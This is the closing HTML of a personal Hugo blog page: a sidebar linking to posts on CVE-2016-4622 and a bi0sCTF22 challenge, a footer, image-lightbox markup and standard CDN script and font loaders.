            <h2 class="article-title">Notes on CVE-2016-4622</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/posts/bi0sctf22-n0tes/">
        
        

        <div class="article-details">
            <h2 class="article-title">bi0sCTF22 - n0tes</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 spektre
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
